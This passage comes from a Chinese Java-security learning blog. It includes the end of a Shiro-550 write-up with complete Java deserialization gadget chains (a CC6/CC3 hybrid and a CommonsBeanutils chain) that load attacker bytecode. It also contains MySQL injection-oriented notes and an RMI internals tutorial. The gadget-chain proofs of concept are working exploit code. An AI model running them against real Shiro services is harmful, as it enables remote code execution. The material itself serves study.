<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC2</span></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>

<p>再把老的<strong>CommonsCollections6</strong>的代码复制过来，将原来<strong>TiedMapEntry</strong>构造时的第二个参数<strong>key</strong>，改为前面创建的<strong>TemplatesImpl</strong>对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line">HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">lazyMap.remove(templates);</span><br></pre></td></tr></table></figure></div>

<p>最后将<strong>lazyMap</strong>中假的<strong>Transformer</strong>对象改回真正有用的<strong>invokerTransformer</strong>对象：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">lazyMapClassDeclaredField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">lazyMapClassDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">lazyMapClassDeclaredField.set(lazyMap,invokerTransformer);</span><br></pre></td></tr></table></figure></div>

<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC3</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//CC2</span></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//CC6</span></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line">HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">lazyMapClassDeclaredField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">lazyMapClassDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">lazyMapClassDeclaredField.set(lazyMap,invokerTransformer);</span><br><span class="line"></span><br><span class="line">serialize(map2);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>然后将生成的<strong>ser.bin</strong>序列化文件利用上面的加密脚本进行加密后发送过去，成功弹出计算器</p>
<h2 id="CB链"><a href="#CB链" class="headerlink" title="CB链"></a>CB链</h2><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC3</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//PropertyUtils.getProperty(templates,&quot;outputProper</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//CB</span></span><br><span class="line"><span class="type">BeanComparator</span> <span class="variable">BeanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line"><span class="comment">//CC2</span></span><br><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(BeanComparator);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;BeanComparator&gt; beanComparatorClass = BeanComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">property</span> <span class="operator">=</span> beanComparatorClass.getDeclaredField(<span class="string">&quot;property&quot;</span>);</span><br><span class="line">property.setAccessible(<span class="literal">true</span>);</span><br><span class="line">property.set(BeanComparator,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;PriorityQueue&gt; priorityQueueClass = PriorityQueue.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">comparator.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">serialize(priorityQueue);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>注：</strong></p>
<ul>
<li><strong>Shiro版本问题</strong></li>
</ul>
<p><strong>Java</strong>在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的<strong>serialVersionUID</strong>值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的<strong>serialVersionUID</strong>不同，则反序列化就会异常退出，避免后续的未知隐患。</p>
<p>报错信息：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">org.apache.commons.beanutils.BeanComparator; local <span class="keyword">class</span> <span class="title class_">incompatible</span>: stream <span class="type">classdesc</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2044202215314119608</span>, local <span class="keyword">class</span> <span class="title class_">serialVersionUID</span> = -<span class="number">3490850999041592962</span></span><br></pre></td></tr></table></figure></div>

<p>所以，当<strong>commons-Beanutils</strong>的版本不一致时会报错，所以你可以在本地将版本更换成一致的</p>
<ul>
<li><strong>Commons Collections依赖问题</strong></li>
</ul>
<p>在<strong>Shiro</strong>中，它的<strong>commons-beanutils</strong>虽然包含了一部分<strong>commons-collections</strong>的类，但却不全。</p>
<p>所以需要将<strong>BeanComparator</strong>的比较器更换成<strong>Java</strong>、<strong>shiro</strong>或者是<strong>Commons-Beanutils</strong>里面符合的类即可</p>
<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><h1 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h1><p>P牛知识星球-Java安全漫谈</p>
<p>B站-白日梦组长</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&vd_source=19d2e433219440bcf5304fbe8a00b7ff" >https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&amp;vd_source=19d2e433219440bcf5304fbe8a00b7ff <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Y4tacker</p>
<p><a class="link"   href="https://github.com/Y4tacker/JavaSec" >https://github.com/Y4tacker/JavaSec <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Shiro550</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL</title>
    <url>/2023/08/26/Web%E5%AE%89%E5%85%A8/MySQL/</url>
    <content><![CDATA[<h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--单行注释 #、--+(&#x27;+&#x27;代表空格)</span><br><span class="line"></span><br><span class="line">--内联注释 /**/</span><br></pre></td></tr></table></figure></div>

<h1 id="MySQL字段"><a href="#MySQL字段" class="headerlink" title="MySQL字段"></a>MySQL字段</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">- information_schema   --包含数据库的所有信息（5.0以上的版本）</span><br><span class="line"></span><br><span class="line">- schema   --存放用户创建的所有数据库库名</span><br><span class="line">  - schema_name   --数据库名字段</span><br><span class="line">- tables   --存放表名及所属的数据库名</span><br><span class="line">  - table_schema   --所属数据库名字段</span><br><span class="line">  - table_name   --表名字段</span><br><span class="line"></span><br><span class="line">- columns   --该表存放列名以及所属的数据库名和所属的数据表名</span><br><span class="line">  - table_schema   --所属数据库名字段</span><br><span class="line">  - table_name   --所属表名字段</span><br><span class="line">  - cloumn_name   --列名字段</span><br></pre></td></tr></table></figure></div>

<h1 id="MySQL常用函数"><a href="#MySQL常用函数" class="headerlink" title="MySQL常用函数"></a>MySQL常用函数</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">- user()   --当前使用数据库的用户</span><br><span class="line">- version()、@@version   --返回当前数据库版本</span><br><span class="line">- database()   --返回当前使用的数据库</span><br><span class="line">- @@datadir   --返回当前数据库位置</span><br><span class="line">- @@version_compile_os   --返回当前操作系统版本</span><br><span class="line">- concat()、group_concat()   --将多个字符连接成一个字符串</span><br><span class="line">- substr()、subtring()、mid()  --截取字符串的一部分</span><br><span class="line">- length()   --返回字符串长度</span><br><span class="line">- ascii()、ord()   --返回对应的ASCII码</span><br><span class="line">- sleep()   --等待时间</span><br></pre></td></tr></table></figure></div>







]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI(一)-基础</title>
    <url>/2023/09/30/Java%E5%AE%89%E5%85%A8/RMI(%E4%B8%80)%E2%80%94%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在学习<strong>RMI</strong>的反序列化漏洞，简单的记录下<strong>RMI</strong>的实现流程和可能存在的利用点</p>
<h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><p><strong>RMI</strong>，是<strong>Remote Method Invocation（远程方法调用）</strong>的缩写，即在一个<strong>JVM</strong>中<strong>java</strong>程序调用在另一个远程<strong>JVM</strong>中运行的<strong>java</strong>程序，这个远程<strong>JVM</strong>既可以在同一台实体机上，也可以在不同的实体机上，两者之间通过网络进行通信。</p>
<p><strong>RMI</strong>依赖的通信协议为<strong>JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)<strong>，该协议为</strong>Java</strong>定制，要求服务端与客户端都为<strong>Java</strong>编写。这个协议就像<strong>HTTP</strong>协议一样，规定了客户端和服务端通信要满足的规范。</p>
<p><strong>RMI</strong>有三个对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Registry : 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。</span><br><span class="line">Server : 远程方法的提供者。</span><br><span class="line">Client : 远程方法的调用者</span><br></pre></td></tr></table></figure></div>

<h1 id="0x02-简单使用"><a href="#0x02-简单使用" class="headerlink" title="0x02 简单使用"></a>0x02 简单使用</h1><h2 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h2><p>从RMI设计角度来讲，基本分为三层架构模式来实现<strong>RMI</strong>，分别为<strong>RMI</strong>服务端，<strong>RMI</strong>客户端和<strong>RMI</strong>注册中心</p>
<ul>
<li><strong>Client-客户端</strong>：客户端调用服务端的方法</li>
<li><strong>Server-服务端</strong>：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果</li>
<li><strong>Registry-注册中心</strong>：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用（在<strong>低版本的JDK</strong>中，<strong>Server</strong>与<strong>Registry</strong>是可以不在一台服务器上的，而在<strong>高版本的JDK</strong>中，<strong>Server</strong>与<strong>Registry</strong>只能在一台服务器上，否则无法注册成功）</li>
</ul>
<h2 id="RMI服务端"><a href="#RMI服务端" class="headerlink" title="RMI服务端"></a>RMI服务端</h2><h3 id="远程对象"><a href="#远程对象" class="headerlink" title="远程对象"></a>远程对象</h3><p>远程调用方法的对象必须继承<strong>java.rmi.Remote</strong>接口</p>
<p>远程对象的实现类必须继承<strong>UnicastRemoteObject</strong>类，如果没有继承<strong>UnicastRemoteObject</strong>，则需手动创建</p>
<ul>
<li><strong>IRemoteObj</strong>接口</li>
</ul>
<p>该接口是客户端和服务端共用的接口，内部定义了我们将要远程调用的对象方法<strong>sayHello()</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span>&#123;</span><br><span class="line">    <span class="comment">//sayHello就是客户端要调用的方法，需要抛出RemoteException</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>RemoteObjImpl</strong>实现类</li>
</ul>
<p><strong>RemoteObjImpl</strong>是一个服务端远程对象，提供了一个<strong>sayHello</strong>方法供远程调用</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public RemoteObjImpl() throws RemoteException &#123;</span></span><br><span class="line"><span class="comment">////        如果不继承UnicastRemoteObject就需要手工导入</span></span><br><span class="line"><span class="comment">////        UnicastRemoteObject.exportObject(this,0);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="comment">//将小写转成大写</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">upKeywords</span> <span class="operator">=</span> keywords.toUpperCase();</span><br><span class="line">        System.out.println(upKeywords);</span><br><span class="line">        <span class="keyword">return</span> upKeywords;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>RMIServer</strong></li>
</ul>
<p>主类<strong>RMIServer</strong>主要用来创建<strong>registry</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//绑定注册中心</span></span><br><span class="line">        <span class="type">RemoteObjImpl</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Registry端"><a href="#Registry端" class="headerlink" title="Registry端"></a>Registry端</h2><p>先将被远程调用的实现类<strong>RemoteObjImpl</strong>实例化，并且在本地某个端口创建一个<strong>registry</strong></p>
<p>再使用<strong>Naming.bind</strong>将实例化的对象和地址对象绑定在一起</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//绑定注册中心</span></span><br><span class="line">    <span class="type">RemoteObjImpl</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">    <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">    Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>,remoteObj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RMI客户端"><a href="#RMI客户端" class="headerlink" title="RMI客户端"></a>RMI客户端</h2><ul>
<li><strong>IRemoteObj</strong>接口</li>
</ul>
<p>该接口与服务端接口要一致，不然无法调用对应的方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>RMIClient</strong></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, NamingException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">hello</span> <span class="operator">=</span> remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x03-流程实现"><a href="#0x03-流程实现" class="headerlink" title="0x03 流程实现"></a>0x03 流程实现</h1><h2 id="创建远程对象"><a href="#创建远程对象" class="headerlink" title="创建远程对象"></a>创建远程对象</h2><p>在初始化的时候，会先创建一个<strong>UnicastRemoteObject</strong>对象，在调用其<strong>exportObject</strong>来将远程对象导出</p>
<p>此时的<strong>port</strong>赋值为<strong>0</strong>，代表会把一个远程对象发布到一个随机端口上</p>
<p>它跟注册中心的<strong>1099</strong>是不一样的</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">this</span>.port = port;</span><br><span class="line">    exportObject((Remote) <span class="built_in">this</span>, port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再来看一下<strong>exportObject</strong>方法</p>
<p>可以看到有两个参数，第一个参数是<strong>obj</strong>，主要是来实现逻辑的</p>
<p>第二个参数是**new UnicastServerRef(port)**，主要是来实现网络请求的逻辑实现</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那就跟进<strong>UnicastServerRef</strong>中，可以看到实现了个<strong>LiveRef</strong>对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(port));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那我们在看看<strong>LiveRef</strong>又做了什么</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>((<span class="keyword">new</span> <span class="title class_">ObjID</span>()), port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>很明显第一个参数是个<strong>ID</strong>，所以直接去看一下它的构造函数</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(ObjID objID, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(objID, TCPEndpoint.getLocalEndpoint(port), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>主要来看看这个<strong>getLocalEndpoint</strong>是干嘛的</p>
<p>可以看到这边返回值是一个<strong>TCPEndpoint</strong>类型的对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TCPEndpoint <span class="title function_">getLocalEndpoint</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getLocalEndpoint(port, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>TCPEndpoint</strong>是一个网络请求的类，我们可以去看一下它的构造函数，传参进去一个<strong>IP</strong>与一个<strong>端口</strong>，也就是说传进去一个<strong>IP</strong>和一个<strong>端口</strong>，就可以进行网络请求。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TCPEndpoint</span><span class="params">(String host, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(host, port, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着继续去看一下<strong>LiveRef</strong>的构造函数做了什么</p>
<p>发现<strong>host</strong>和<strong>port</strong>是赋值到了<strong>endpoint</strong>里面，而<strong>endpoint</strong>又是被封装在<strong>LiveRef</strong>里面的</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(ObjID objID, Endpoint endpoint, <span class="type">boolean</span> isLocal)</span> &#123;</span><br><span class="line">    ep = endpoint;</span><br><span class="line">    id = objID;</span><br><span class="line">    <span class="built_in">this</span>.isLocal = isLocal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>一路返回，在<strong>UnicastServerRef</strong>的父类<strong>UnicastRef</strong>中</p>
<p>又将<strong>LiveRef</strong>赋值给<strong>ref</strong>，也就是说我们只创建了一个<strong>LiveRef</strong>，对应远程服务的端口</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastRef</span><span class="params">(LiveRef liveRef)</span> &#123;</span><br><span class="line">    ref = liveRef;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着我们回到最初，去看看<strong>exportObject</strong>做了什么</p>
